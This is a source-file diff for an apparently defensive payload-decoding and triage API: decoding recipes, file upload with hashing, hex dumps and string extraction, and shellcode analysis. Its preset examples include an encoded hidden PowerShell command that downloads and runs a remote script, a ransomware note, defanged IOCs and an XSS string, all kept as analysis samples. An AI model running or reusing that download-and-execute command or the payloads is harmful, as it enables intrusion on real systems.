@@ -1,0 +1,381 @@
+"""Operations router — /api/operations, /api/examples, /api/recipe/run, /api/upload,
+                       /api/decode/smart, /api/decode/magic,
+                       /api/analyze/command, /api/analyze/shellcode.
+"""
+from __future__ import annotations
+import base64 as _b64
+import hashlib
+import re
+from typing import Any, Dict, List, Optional
+
+from fastapi import APIRouter, Depends, File, HTTPException, UploadFile
+
+from schemas import (
+    RecipeStep, RunRecipeIn, RunRecipeOut, AutoIn, MagicIn,
+    ShellcodeIn, CommandAnalyzeIn,
+)
+from deps import db, get_current_user
+from operations import (
+    OPERATIONS, list_operations, run_operation,
+    detect_payload_type,
+)
+from smart_decoder import smart_decode
+from magic_decoder import magic_decode
+import models_studio as ms
+
+router = APIRouter()
+
+
+# --- Load Example Presets (moved from server.py) --------------------------- #
+EXAMPLES = [
+    {
+        "id": "powershell-encoded",
+        "label": "PowerShell -EncodedCommand",
+        "input": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAvAHAALgBwAHMAMQAnACkA",
+    },
+    {
+        "id": "ransomware-note",
+        "label": "Ransomware Note",
+        "input": "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\nAll your important documents, photos, databases and other files have been encrypted with military-grade AES-256.\n\nTo restore your files you must pay 0.75 BTC to the following address within 72 hours:\n\nBTC ADDRESS: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n\nContact us via Tor: http://ransomxyz1abcdef23456789ghijklmn.onion\nEmail: recover-your-files@protonmail.com\n\nDo NOT rename encrypted files. Do NOT try to decrypt with third-party software.\n",
+    },
+    {
+        "id": "defanged-iocs",
+        "label": "Defanged IOCs Bundle",
+        "input": "IOC dump from IR ticket #4421:\n\nURLs:\n  hxxps://malicious-cdn[.]example[.]com/payload[.]exe\n  hxxp://phish[.]login-microsoft-secure[.]net/auth\n\nIPs:\n  185[.]220[.]101[.]45\n  45[.]137[.]21[.]9\n\nEmails:\n  attacker[@]evilcorp[.]ru\n  admin[@]phish[.]login-microsoft-secure[.]net\n\nHashes:\n  MD5:    e10adc3949ba59abbe56e057f20f883e\n  SHA256: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8\n",
+    },
+    {
+        "id": "nested-base64-gzip",
+        "label": "Nested Base64 → gzip",
+        "input": "H4sIAIQ5VWoC/xXKyRWAIAwFwFZ+A3ryWYkNBBIRF4LEvXr1PNMNgnWPfoIreib0emHcl2zQQwq2j2d6brCGGt0QDZnuWYlxkiE8MVdel1zETPjvCY5M2qaS5JWF6xdjITdRYgAAAA==",
+    },
+    {
+        "id": "url-encoded-xss",
+        "label": "URL-encoded XSS",
+        "input": "%3Cscript%3Ealert(String.fromCharCode(88%2C83%2C83))%3C%2Fscript%3E",
+    },
+]
+
+
+# --- File upload helpers --------------------------------------------------- #
+def _detect_file_type(raw: bytes, filename: str) -> Dict[str, str]:
+    magics = [
+        (b"MZ", "PE (Windows executable / DLL)", "application/x-dosexec"),
+        (b"\x7fELF", "ELF (Linux executable)", "application/x-elf"),
+        (b"\xCA\xFE\xBA\xBE", "Java class / Mach-O fat", "application/java-vm"),
+        (b"\xFE\xED\xFA", "Mach-O binary", "application/x-mach-binary"),
+        (b"PK\x03\x04", "ZIP archive (docx/xlsx/jar/apk possible)", "application/zip"),
+        (b"Rar!\x1a\x07", "RAR archive", "application/vnd.rar"),
+        (b"\x1f\x8b", "GZIP compressed", "application/gzip"),
+        (b"\x42\x5a\x68", "BZIP2 compressed", "application/x-bzip2"),
+        (b"\xFD7zXZ", "XZ compressed", "application/x-xz"),
+        (b"%PDF-", "PDF document", "application/pdf"),
+        (b"\xD0\xCF\x11\xE0", "MS OLE compound (legacy Office / MSI)", "application/x-ole"),
+        (b"\x89PNG", "PNG image", "image/png"),
+        (b"\xff\xd8\xff", "JPEG image", "image/jpeg"),
+        (b"GIF87a", "GIF image", "image/gif"),
+        (b"GIF89a", "GIF image", "image/gif"),
+        (b"#!/", "Shell script (shebang)", "text/x-shellscript"),
+        (b"<?xml", "XML document", "application/xml"),
+        (b"{\"", "JSON (likely)", "application/json"),
+    ]
+    for prefix, label, mime in magics:
+        if raw.startswith(prefix):
+            return {"label": label, "mime": mime, "extension": _ext(filename)}
+    if _mostly_printable(raw[:2048].decode("utf-8", errors="replace")):
+        return {"label": "Plain text", "mime": "text/plain", "extension": _ext(filename)}
+    return {"label": "Unknown binary", "mime": "application/octet-stream", "extension": _ext(filename)}
+
+
+def _ext(filename: str) -> str:
+    if "." not in filename: return ""
+    return filename.rsplit(".", 1)[-1].lower()
+
+
+def _mostly_printable(s: str, threshold: float = 0.85) -> bool:
+    if not s: return False
+    printable = sum(1 for c in s if c.isprintable() or c in "\n\r\t")
+    return printable / max(1, len(s)) >= threshold
+
+
+def _hex_dump(data: bytes, width: int = 16) -> str:
+    lines = []
+    for i in range(0, len(data), width):
+        chunk = data[i:i + width]
+        hex_part = " ".join(f"{b:02x}" for b in chunk)
+        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
+        lines.append(f"{i:08x}  {hex_part:<{width * 3}}  {ascii_part}")
+    return "\n".join(lines)
+
+
+def _extract_strings(raw: bytes, min_len: int = 4, limit: int = 400) -> List[str]:
+    out, cur = [], []
+    for b in raw:
+        if 32 <= b < 127:
+            cur.append(chr(b))
+        else:
+            if len(cur) >= min_len:
+                out.append("".join(cur))
+                if len(out) >= limit: break
+            cur = []
+    if len(cur) >= min_len and len(out) < limit:
+        out.append("".join(cur))
+    return out
+
+
+# --- Endpoints ------------------------------------------------------------- #
+@router.get("/operations")
+async def get_ops(user=Depends(get_current_user)):
+    return list_operations()
+
+
+@router.get("/examples")
+async def get_examples(user=Depends(get_current_user)):
+    return EXAMPLES
+
+
+@router.post("/recipe/run", response_model=RunRecipeOut)
+async def run_recipe(body: RunRecipeIn, user=Depends(get_current_user)):
+    current = body.input
+    steps_output: List[Dict[str, Any]] = []
+    errors: List[Dict[str, str]] = []
+    for i, step in enumerate(body.steps):
+        try:
+            current = run_operation(step.op, current, step.args)
+            steps_output.append({
+                "index": i, "op": step.op,
+                "output_preview": current[:400],
+                "output_length": len(current),
+            })
+        except Exception as e:
+            errors.append({"index": str(i), "op": step.op, "error": str(e)})
+            steps_output.append({"index": i, "op": step.op, "error": str(e)})
+            break
+    return RunRecipeOut(
+        output=current, steps_output=steps_output,
+        detected_type=detect_payload_type(current), errors=errors,
+    )
+
+
+@router.post("/upload")
+async def upload(file: UploadFile = File(...), user=Depends(get_current_user)):
+    """Universal file upload — accepts ANY file format."""
+    raw = await file.read()
+    size = len(raw)
+    hashes = {
+        "md5": hashlib.md5(raw).hexdigest(),
+        "sha1": hashlib.sha1(raw).hexdigest(),
+        "sha256": hashlib.sha256(raw).hexdigest(),
+    }
+    file_type = _detect_file_type(raw, file.filename or "")
+    text = None
+    try:
+        candidate = raw.decode("utf-8")
+        if _mostly_printable(candidate):
+            text = candidate
+    except UnicodeDecodeError:
+        pass
+    if text is None:
+        try:
+            candidate = raw.decode("utf-16-le")
+            if _mostly_printable(candidate):
+                text = candidate
+        except UnicodeDecodeError:
+            pass
+    hex_dump = _hex_dump(raw[:512])
+    strings_out = _extract_strings(raw, min_len=4, limit=400)
+    if text is not None:
+        content = text[:400_000]
+    else:
+        content = (
+            f"[BINARY FILE — {file.filename}]\n"
+            f"Size: {size} bytes\n"
+            f"Type: {file_type['label']}\n"
+            f"MD5:    {hashes['md5']}\n"
+            f"SHA1:   {hashes['sha1']}\n"
+            f"SHA256: {hashes['sha256']}\n\n"
+            f"── HEX DUMP (first 512 bytes) ──\n{hex_dump}\n\n"
+            f"── EXTRACTED STRINGS (top {min(200, len(strings_out))}) ──\n"
+            + "\n".join(strings_out[:200])
+        )
+    return {
+        "filename": file.filename, "size": size,
+        "hashes": hashes, "file_type": file_type,
+        "text": text[:400_000] if text else None,
+        "hex_dump": hex_dump, "strings": strings_out, "content": content,
+    }
+
+
+@router.post("/decode/magic")
+async def decode_magic(body: MagicIn, user=Depends(get_current_user)):
+    """Recursive multi-branch auto-decoder — returns top-N candidate chains + scores."""
+    return magic_decode(body.input, max_depth=body.max_depth,
+                        max_branches=body.max_branches, top_n=body.top_n)
+
+
+@router.post("/analyze/command")
+async def analyze_command_endpoint(body: CommandAnalyzeIn, user=Depends(get_current_user)):
+    """Intelligent Command-Line Analysis Engine — semantic parsing first."""
+    from command_analyzer import analyze_command as _ac
+    return _ac(body.input, force_decode_span=body.force_decode_span)
+
+
+@router.post("/analyze/shellcode")
+async def analyze_shellcode(body: ShellcodeIn, user=Depends(get_current_user)):
+    """Shellcode / binary analysis — auto-detects arch, disassembles via Capstone."""
+    from shellcode_analyzer import analyze as _analyze_shellcode
+    raw_in = body.input.strip()
+    data: bytes = b""
+    src = "utf8"
+    hex_stripped = re.sub(r"[\s:]", "", raw_in)
+    if hex_stripped and len(hex_stripped) % 2 == 0 and re.fullmatch(r"[0-9a-fA-F]+", hex_stripped):
+        try:
+            data = bytes.fromhex(hex_stripped)
+            src = "hex"
+        except Exception:
+            data = b""
+    if not data:
+        try:
+            b64 = re.sub(r"\s+", "", raw_in)
+            data = _b64.b64decode(b64 + "=" * (-len(b64) % 4), validate=False)
+            if data:
+                src = "base64"
+        except Exception:
+            data = b""
+    if not data:
+        data = raw_in.encode("utf-8", errors="replace")
+        src = "utf8"
+    result = _analyze_shellcode(data, arch=body.arch, max_insns=body.max_insns)
+    result["input_source"] = src
+    result["input_bytes"] = len(data)
+    return result
+
+
+@router.post("/decode/smart")
+async def decode_smart(body: AutoIn, user=Depends(get_current_user)):
+    """Custom recipe match first, else deterministic BEST-of {smart, magic}.
+
+    Feb-2026 upgrade: previously used only greedy `smart_decode`, which stopped
+    at the loader-script layer on multi-layer stagers. Now uses
+    `deterministic_best_decode` (smart+magic race) so this endpoint reaches the
+    SAME terminal state as the MAGIC button on every supported payload.
+    """
+    from analysis_core import deterministic_best_decode
+
+    custom_matches = await ms.find_matching_recipes(db, body.input)
+    if custom_matches:
+        best = custom_matches[0]
+        await ms.increment_usage(db, best["id"])
+        try:
+            steps_for_run = [RecipeStep(op=s["op"], args=s.get("args") or {})
+                             for s in best["ops"] if s.get("op") in OPERATIONS]
+            if steps_for_run:
+                result_custom = await run_recipe(
+                    RunRecipeIn(input=body.input, steps=steps_for_run), user=user,
+                )
+                recipe_out = [
+                    {"op": s.op, "args": s.args, "reason": f"custom recipe: {best['name']}",
+                     "custom": True, "model_id": best["id"], "model_name": best["name"]}
+                    for s in steps_for_run
+                ]
+                return {
+                    "recipe": recipe_out,
+                    "output": result_custom.output,
+                    "notes": [f"Applied custom recipe '{best['name']}' from Model Studio"],
+                    "detected_type": detect_payload_type(result_custom.output),
+                    "engine": "custom_recipe",
+                    "reached_shellcode": False,
+                    "trace": [
+                        {"op": s.op, "args": s.args, "reason": f"custom recipe: {best['name']}",
+                         "output_preview": (result_custom.steps_output[i].get("output_preview") or "")
+                         if i < len(result_custom.steps_output) else "",
+                         "output_length": result_custom.steps_output[i].get("output_length")
+                         if i < len(result_custom.steps_output) else None}
+                        for i, s in enumerate(steps_for_run)
+                    ],
+                    "custom_recipes_matched": [
+                        {"id": r["id"], "name": r["name"]} for r in custom_matches
+                    ],
+                }
+        except Exception:
+            pass
+
+    # Deterministic best-of race (smart vs magic) — this is the key upgrade
+    det = deterministic_best_decode(body.input)
+
+    # Build per-layer trace by re-running the winning chain step-by-step so
+    # the frontend Decoding Trace panel has intermediate outputs to display.
+    # Note: `extract-payload` is a virtual op that the magic decoder uses
+    # internally to strip script wrappers — we handle it here directly via
+    # the payload sanitizer.
+    from payload_sanitizer import sanitize_encapsulated_payload, find_all_base64_spans
+    trace: List[Dict[str, Any]] = []
+    cur = body.input
+    for step in det.get("steps") or []:
+        op_id = step["op"]
+        args = step.get("args") or {}
+        try:
+            if op_id == "extract-payload":
+                iso = sanitize_encapsulated_payload(cur)
+                if iso and iso != cur.strip():
+                    nxt = iso
+                else:
+                    # nested base64 span extraction
+                    spans = find_all_base64_spans(cur, min_len=24)
+                    nxt = spans[0] if spans else cur
+            else:
+                nxt = run_operation(op_id, cur, args)
+        except Exception as e:
+            trace.append({"op": op_id, "args": args,
+                          "error": str(e), "reason": _reason_for_op(op_id)})
+            break
+        preview = nxt[:400] if isinstance(nxt, str) else str(nxt)[:400]
+        trace.append({
+            "op": op_id, "args": args,
+            "reason": _reason_for_op(op_id),
+            "output_preview": preview,
+            "output_length": len(nxt) if isinstance(nxt, str) else None,
+        })
+        cur = nxt
+
+    return {
+        "recipe": [{"op": s["op"], "args": s.get("args") or {}, "reason": _reason_for_op(s["op"])}
+                   for s in det.get("steps") or []],
+        "output": det.get("output") or "",
+        "notes": det.get("notes") or [],
+        "detected_type": detect_payload_type(det.get("output") or ""),
+        "engine": det.get("engine"),
+        "reached_shellcode": det.get("reached_shellcode", False),
+        "confidence": int(round(min(1.0, det.get("score", 0.0)) * 100)),
+        "trace": trace,
+        "custom_recipes_matched": [
+            {"id": r["id"], "name": r["name"]} for r in custom_matches
+        ],
+    }
+
+
+def _reason_for_op(op: str) -> str:
+    """Human-friendly explanation for why the deterministic decoder picked this op."""
+    return {
+        "extract-payload": "Isolated payload string from script/command wrapper",
+        "base64-decode": "Base64-encoded payload detected",
+        "base64-gzip": "Base64 → GZIP magic-byte sequence detected (1f 8b)",
+        "base64-zlib": "Base64 → ZLIB magic-byte sequence detected (78 xx)",
+        "gzip-decompress": "GZIP-compressed layer",
+        "zlib-decompress": "ZLIB-compressed layer",
+        "lzma-decompress": "LZMA / XZ compressed layer",
+        "bzip2-decompress": "BZIP2-compressed layer",
+        "hex-decode": "Hex-encoded printable payload",
+        "url-decode": "URL percent-encoded characters",
+        "html-decode": "HTML entity encoding detected",
+        "powershell-encoded": "PowerShell -EncodedCommand base64 (UTF-16LE)",
+        "powershell-deobfuscate": "PowerShell tick / [char[]] obfuscation",
+        "cmd-deobfuscate": "CMD.exe caret obfuscation",
+        "refang-iocs": "Defanged IOCs (hxxp / [.] / [@])",
+        "js-charcode": "JavaScript String.fromCharCode()",
+        "js-unescape": "JavaScript \\xNN hex escapes",
+        "unicode-escape": "\\uNNNN unicode escapes",
+        "utf16le-decode": "UTF-16LE byte pattern",
+        "xor": "Single-byte XOR key recovered from wrapper",
+        "env-expand": "Resolved %TEMP% / $env:* / ${HOME} placeholders",
+        "extract-base64": "Extracted embedded base64 blob(s) from wrapper text",
+    }.get(op, f"Applied {op}")
